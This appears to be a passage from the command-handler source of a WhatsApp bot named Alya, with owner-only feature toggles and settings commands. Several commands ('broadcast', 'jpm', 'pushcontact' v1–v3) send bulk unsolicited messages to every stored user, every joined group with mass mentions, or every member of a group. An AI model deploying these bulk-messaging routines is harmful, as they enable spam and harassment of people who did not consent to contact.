                    replygcalya(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autorecord':
                if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (q === 'on') {
                    db.data.settings[botNumber].autorecord = true
                    replygcalya(`Successfully changed Auto-Recording to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecord = false
                    replygcalya(`Successfully changed Auto-Recording to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autotype':
                if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (q === 'on') {
                    db.data.settings[botNumber].autotype = true
                    replygcalya(`Successfully changed Auto-Typing to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autotype = false
                    replygcalya(`Successfully changed Auto-Typing to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autobio':
                if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].autobio = true
                    replygcalya(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autobio = false
                    replygcalya(`Successfully Changed AutoBio To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autosticker': case 'autostickergc':
if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].autosticker = true
                    replygcalya(`Successfully Changed Auto Sticker To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autosticker = false
                    replygcalya(`Successfully Changed Auto Sticker To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autodownload': case 'autodl':
if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].autodownload = true
                    replygcalya(`Successfully Changed Auto Download To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autodownload = false
                    replygcalya(`Successfully Changed Auto Download To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autoblock':
                if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].autoblocknum = true
                    replygcalya(`Successfully Changed Auto-Block To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autoblocknum = false
                    replygcalya(`Successfully Changed Auto-Block To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlygroup':
            case 'onlygc':
                if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].onlygrub = true
                    replygcalya(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlygrub = false
                    replygcalya(`Successfully Changed Onlygroup To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].onlypc = true
                    replygcalya(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlypc = false
                    replygcalya(`Successfully Changed Only-Pc To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindia':
            case 'onlyindianumber':
                if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindia = true
                    replygcalya(`Successfully Changed Only-Indian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindia = false
                    replygcalya(`Successfully Changed Only-Indian To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindo':
            case 'onlyindonumber':
                if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindo = true
                    replygcalya(`Successfully Changed Only-Indonesian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindo = false
                    replygcalya(`Successfully Changed Only-Indonesian To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'self': case 'public': case 'mode': {
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (q == 'on') {
                AlyaBotInc.public = true
                replygcalya('*Successful in Changing To Public Usage*')
                } else if (q == 'off') {
                AlyaBotInc.public = false
                replygcalya('*Successful in Changing To Self Usage*')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT PUBLIC/SELF 🍁",
"sections":[{"title":"CHOOSE PUBLIC/SELF",
"rows":[{"header":"PUBLIC 👥",
"title":"CHOOSE ",
"description":"PUBLIC 👥",
"id":"${prefix+command} on"},
{"header":"SELF 👤",
"title":"CHOOSE ",
"description":"SELF 👤",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'setexif':
            case 'setwm':
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (!text) return replygcalya(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcalya(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
                case 'setprefix':
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (!text) return replygcalya(`Example : ${prefix + command} packname|author`)
                global.xprefix = text
                replygcalya(`Prefix successfully changed to ${text}`)
                break
                case 'setautoblock':
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (!text) return replygcalya(`Example : ${prefix + command} packname|author`)
                global.autoblocknumber = text
                replygcalya(`Auto-Block number successfully changed to ${text}`)
                break
                case 'setantiforeign':
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (!text) return replygcalya(`Example : ${prefix + command} packname|author`)
                global.antiforeignnumber = text
                replygcalya(`Anti-foreign number successfully changed to ${text}`)
                break
            case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (!quoted) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await AlyaBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await AlyaBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcalya(mess.done)
                } else {
                    var memeg = await AlyaBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcalya(mess.done)
                }
                break
            case 'leave':
            case 'out':
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (!m.isGroup) return AlyaStickGroup()
                replygcalya('Bye Everyone 🥺')
                await AlyaBotInc.groupLeave(m.chat)
            break
            case 'bc':
            case 'broadcast': {
               if (!AlyaTheQueen) return AlyaStickOwner()
               if (!text) return replygcalya('Text?')
               let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
               for (let i of Object.keys(global.db.data.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await AlyaBotInc.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await AlyaBotInc.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await AlyaBotInc.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               replygcalya(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
            }
            break
            case 'jpm': case 'post': {
if (!AlyaTheQueen) return AlyaStickOwner()
if (!text) return replygcalya(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
await replygcalya(`Waiting in progress`)
let getGroups = await AlyaBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await AlyaBotInc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await AlyaBotInc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await AlyaBotInc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
replygcalya(`Success`)
}
break
            case 'pushcontact': {
    if (!AlyaTheQueen) return AlyaStickOwner()
      if (!m.isGroup) return replygcalya(`The feature works only in grup`)
    if (!text) return replygcalya(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcalya(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    AlyaBotInc.sendMessage(pler, { text: q})
     }  
     replygcalya(`Done`)
      }
      break
case "pushcontactv2":{
if (!AlyaTheQueen) return AlyaStickOwner()
if (!q) return replygcalya(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
await AlyaStickWait()
const metadata2 = await AlyaBotInc.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
AlyaBotInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcalya(`Success`)
}
break
case 'pushcontactv3':
if (!AlyaTheQueen) return AlyaStickOwner()
if (!isGroup) return AlyaStickGroup()
if (!text) return replygcalya(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await AlyaBotInc.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(1000)
await AlyaBotInc.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await AlyaBotInc.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
replygcalya(`Success`)
break
case 'block': case 'ban': {
